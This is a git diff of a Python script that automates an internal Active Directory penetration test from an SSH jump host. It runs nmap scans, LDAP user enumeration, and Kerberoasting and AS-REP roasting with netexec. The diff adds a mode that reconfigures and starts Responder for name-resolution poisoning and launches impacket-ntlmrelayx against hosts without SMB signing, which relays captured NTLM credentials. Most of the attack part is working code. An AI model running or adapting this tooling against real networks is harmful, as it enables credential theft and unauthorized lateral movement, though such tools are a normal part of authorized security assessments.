@@ -4,6 +4,7 @@ import argparse
 from pathlib import Path
 import yaml
 import time
+import re
 
 class Color:
     GREEN = '\033[92m'
@@ -63,9 +64,6 @@ def process_host(host_config):
     scan_file = ''
 
     for scan in scans:
-        # print(type(scan))
-        # print(scan)
-
         if len(scan_file) == 0:
             scan_file = f'sudo nmap {scan.get('nmap_args', '-dd -T4 -sS -sV -p- --min-rate=500')} -oA segtest/{scan['scan_name']}.tcp {scan['target']}'
             scan_file += f'\nsudo nmap {scan.get('nmap_args', '-dd -T4 -sU -p- --min-rate=1000')} -oA segtest/{scan['scan_name']}.udp {scan['target']}'
@@ -203,11 +201,7 @@ def start_nmaps(scan_file, host):
         xargs = f'xargs -P 2'
 
     command = 'cat segtest/full_nmap.xargs | '+xargs+' -I {} sh -c "{}"'
-
-
     tmux_command = f"tmux new-session -d -s 'seg-scans' '{command}'"
-
-
     execute = run_ssh_command(host_name, tmux_command)
 
     print(f"\nScan started in tmux session 'nmap_scan' on {host_name}!")
@@ -216,17 +210,17 @@ def start_nmaps(scan_file, host):
 
 def checker(host):
     for targets in host['scans']:
-
         command = f'tail -n 1 segtest/{targets['scan_name']}*.xml'
-
-        # print(command[1])
         results = run_ssh_command(host['name'], command) 
         print(results[1])
-        # print(targets)
         
 def en_users(jh, dc_ip, user, password, domain):
-    domain = domain.split('.')
+    ldapsearch = run_ssh_command(jh, 'command -v ldapsearch')
+    if len(ldapsearch[1]) == 0:
+        print('The following tool is missing: ldapsearch')
+        exit()
 
+    domain = domain.split('.')
     dns = ''
     for item in domain:
         if len(dns) == 0:
@@ -256,6 +250,11 @@ def en_users(jh, dc_ip, user, password, domain):
     copy_files(f'{jh}:~/users_descriptions', f'enabled-users/users_descriptions')
 
 def roasting(jh, dc_ip, user, password, domain):
+    netexec = run_ssh_command(jh, 'command -v netexec')
+    if len(netexec[1]) == 0:
+        print('The following tool is missing: netexec')
+        exit()
+
     kerb_cmd = f"netexec ldap {dc_ip} -u '{user.split('@')[0] if '@' in user else user}' -p '{password}' -d {domain} --kdcHost {dc_ip} --kerberoasting kerberoasted-users"
     asrep_cmd = f"netexec ldap {dc_ip} -u '{user.split('@')[0] if '@' in user else user}' -p '{password}' -d {domain} --kdcHost {dc_ip} --asreproast asreproasted-users"
 
@@ -270,6 +269,116 @@ def roasting(jh, dc_ip, user, password, domain):
     
     copy_files(f'{jh}:~/kerberoasted-users', f'roasting/kerberoasted-users')
     copy_files(f'{jh}:~/asreproasted-users', f'roasting/asreproasted-users')
+
+
+def responder_run(jh, config_file=None):
+    if config_file:
+
+        # checking for tools
+        tmux = run_ssh_command(jh, 'command -v tmux')
+        responder = run_ssh_command(jh, 'command -v responder')
+        netexec = run_ssh_command(jh, 'command -v netexec')
+        impacket = run_ssh_command(jh, 'command -v impacket-ntlmrelayx')
+    
+        missing_stuff = []    
+        if len(impacket[1]) == 0:
+            missing_stuff.append('impacket-ntlmrelayx')
+        if len(tmux[1]) == 0:
+            missing_stuff.append('tmux')
+        if len(responder[1]) == 0:
+            missing_stuff.append('responder')
+        if len(netexec[1]) == 0:
+            missing_stuff.append('netexec')
+
+        if missing_stuff : 
+            for item in missing_stuff:
+                print(f'The following tool is missing: {item}')
+            exit()
+
+        # grab ethernet interface to listen on
+        interface = run_ssh_command(jh, 'ip a')
+        interfaces = []
+        for line in interface[1].split('\n'):
+            if_match = re.match(r'^\d+:\s+([^:]+):\s+<.*UP.*>', line)
+            if if_match:
+                current_interface = if_match.group(1)
+                continue
+            # Check for inet line (IPv4 address)
+            if current_interface and re.search(r'inet\s+\d+\.\d+\.\d+\.\d+', line):
+                interfaces.append(current_interface)
+                current_interface = None
+        ifp = []
+        for iface in interfaces:
+            if iface != 'lo' and not iface.startswith(('docker', 'br-', 'veth', 'tun')):
+                ifp.append(iface)
+
+        # grab smb signing disabled list
+        targets = ''
+        for host in config_file['hosts']:
+            if host['name'] == jh:
+                for scan in host['scans']:
+                    targets += scan['target']+'\n'
+
+        # write target list to kali box
+        command = f'echo "{targets}" > scope-signing'
+        run_ssh_command(jh, command)
+
+        # start netexec to create no smg signing list
+        command = 'netexec smb scope-signing --gen-relay-list no-smb-signing.txt'
+        run_ssh_command(jh, command)        
+
+        # turn smb and http off
+        smb_off = "sudo sed -i '/^SMB[[:space:]]*=/ s/On/Off/; /^HTTP[[:space:]]*=/ s/On/Off/' /etc/responder/Responder.conf"
+        stopping = run_ssh_command(jh, smb_off)
+
+        # start responder
+        command = 'sudo responder -Pv -I '+ifp[0]
+        start_resp = run_ssh_command(jh, f"tmux new-session -d -s 'responder' '{command}'")
+
+        # start ntlmrelayx
+        command = 'impacket-ntlmrelayx -tf no-smb-signing.txt -smb2support -socks'
+        start_relay =  run_ssh_command(jh, f"tmux new-session -d -s 'relayx' '{command}'")
+                
+    else:
+        # checking for tools
+        tmux = run_ssh_command(jh, 'command -v tmux')
+        responder = run_ssh_command(jh, 'command -v responder')
+        missing_stuff = []    
+
+        if len(tmux[1]) == 0:
+            missing_stuff.append('tmux')
+        if len(responder[1]) == 0:
+            missing_stuff.append('responder')
+
+        if missing_stuff : 
+            for item in missing_stuff:
+                print(f'The following tool is missing: {item}')
+            exit()
+
+    
+        interface = run_ssh_command(jh, 'ip a')
+        interfaces = []
+        for line in interface[1].split('\n'):
+            if_match = re.match(r'^\d+:\s+([^:]+):\s+<.*UP.*>', line)
+            if if_match:
+                current_interface = if_match.group(1)
+                continue
+            # Check for inet line (IPv4 address)
+            if current_interface and re.search(r'inet\s+\d+\.\d+\.\d+\.\d+', line):
+                interfaces.append(current_interface)
+                current_interface = None
+        ifp = []
+        for iface in interfaces:
+            if iface != 'lo' and not iface.startswith(('docker', 'br-', 'veth', 'tun')):
+                ifp.append(iface)
+
+        # make sure smb and http are on
+        smb = "sudo sed -i '/^SMB[[:space:]]*=/ s/Off/On/; /^HTTP[[:space:]]*=/ s/Off/On/' /etc/responder/Responder.conf"
+        smb_on = run_ssh_command(jh, smb)
+
+        # start responder
+        command = 'sudo responder -Pv -I '+ifp[0]
+        start_resp = run_ssh_command(jh, f"tmux new-session -d -s 'responder' '{command}'")
     
 def main():
     parser = argparse.ArgumentParser(description="Run nmap scan in tmux on remote host")
@@ -301,14 +410,14 @@ def main():
     roasting_parser.add_argument("-password", "-p", required=True, help="Ehm Password of that user?")
     roasting_parser.add_argument("-domain", "-d", required=True, help="target domain. Example: marvel.local")    
 
+    responder_parser = subparsers.add_parser("responder", help="Start responder on target host.")
+    responder_parser.add_argument("-jumphost", "-jh", required=True, help="SSH host to run the command from")
+    responder_parser.add_argument("--config_file", "-c", help="Path to YAML configuration file")
 
-    # parser.add_argument("mode", choices=["launch-scans", "monitor-scans", "scan-results", "start-responder", "parse-scans", "users"], help=" select one of the following <launch|monitor|results>")
-    # parser.add_argument("config_file", help="Path to YAML configuration file")
-
+    parse_parser = subparsers.add_parser("parse", help="Parse nmap output.")
+    parse_parser.add_argument("--nmap-output", "-n", required=True, help="Path to nmap output directory or file.")
 
     args = parser.parse_args()
-
-
 
     if args.mode == 'launch-scans':
         config = load_config(args.config_file)
@@ -335,12 +444,23 @@ def main():
         for host in config['hosts']:
             print(f"\n{color_text('Downloading scans from:', Color.BOLD)} {host['name']}")
 
-
     if args.mode == 'users':
         en_users(args.jumphost, args.dc_ip, args.user, args.password, args.domain)
 
     if args.mode == 'roasting':
         roasting(args.jumphost, args.dc_ip, args.user, args.password, args.domain)        
+
+    if args.mode == 'responder':
+
+        if args.config_file : 
+            config = load_config(args.config_file)
+            # validate_access(config)
+            responder_run(args.jumphost, config)
+        else:
+            responder_run(args.jumphost)
+
+    if args.mode == 'parse' :
+        print('Hello')
 
 if __name__ == "__main__":
     main()
